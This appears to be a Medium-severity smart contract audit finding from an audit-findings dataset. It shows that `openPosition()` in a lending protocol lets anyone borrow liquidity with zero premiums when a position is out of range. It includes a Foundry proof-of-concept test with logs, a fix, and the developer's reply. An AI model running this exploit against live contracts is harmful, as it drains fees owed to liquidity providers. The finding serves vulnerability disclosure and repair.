# [M] openPosition

## Summary
Severity: Medium
Contest weight: 0.7125
Dataset id: 19660
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
In `openPosition()`, it allows `token0PremiumPortion` and `token1PremiumPortion` to be 0 at the same time.

In this case, if `tokenId` enters `out_of_price`, for example, `UpperOutOfRange`, anyone might be able to input:
    
```solidity
    marginFrom = 0
    marginTo = 0
    amountSwap = 0
    zeroForOne = false
    liquidity > 0
```

Note: `amountFromBorrowed + marginFrom == 0`, so `fees == 0`

To open a new Position, borrow Liquidity, but without paying any fees. It’s basically a no-cost loan.

## Proof of Concept
The following test case demonstrates that if it is `out_of_price`, anyone can borrow at no cost.

Add to `OpenPosition.t.sol`:
    
```solidity
    function testZeroFees() public {
        _setupUpperOutOfRange();
        uint128 borrowerLiquidity = _liquidity / _borrowerLiquidityPorition;
        console.log("borrowerLiquidity:",borrowerLiquidity);
        address anyone = address(0x123999);
        vm.startPrank(anyone);
        particlePositionManager.openPosition(
            DataStruct.OpenPositionParams({
                tokenId: _tokenId,
                marginFrom: 0,
                marginTo: 0,
                amountSwap: 0,
                liquidity: borrowerLiquidity,
                tokenFromPremiumPortionMin: 0,
                tokenToPremiumPortionMin: 0,
                marginPremiumRatio: type(uint8).max,
                zeroForOne: false,
                data: ""
            })
        );
        vm.stopPrank();
        (
            ,
            uint128 liquidity,
            ,
            uint128 token0Premium,
            uint128 token1Premium,
            ,
            ,            
        ) = particleInfoReader.getLien(anyone, 0);
        console.log("liquidity:",liquidity);
        console.log("token0Premium:",token0Premium);
        console.log("token1Premium:",token1Premium);
    }
```

Logs:
  borrowerLiquidity: 1739134199054731
  liquidity: 1739134199054731
  token0Premium: 0
  token1Premium: 0

## Recommendation
It is suggested that `openPosition()` should add a minimum `token0PremiumPortion/token1PremiumPortion` limit.
    
```solidity
    function openPosition(
        DataStruct.OpenPositionParams calldata params
    ) public override nonReentrant returns (uint96 lienId, uint256 collateralTo) {
...
    
    require(params.tokenFromPremiumPortionMin >= MIN_FROM_PREMIUM_PORTION,"invalid tokenFromPremiumPortionMin");
    require(params.tokenToPremiumPortionMin >= MIN_TO_PREMIUM_PORTION,"invalid tokenToPremiumPortionMin");
```

It’s a good suggestion. We will add minimum premium in contract (current frontend enforces a minimum 1-2%).
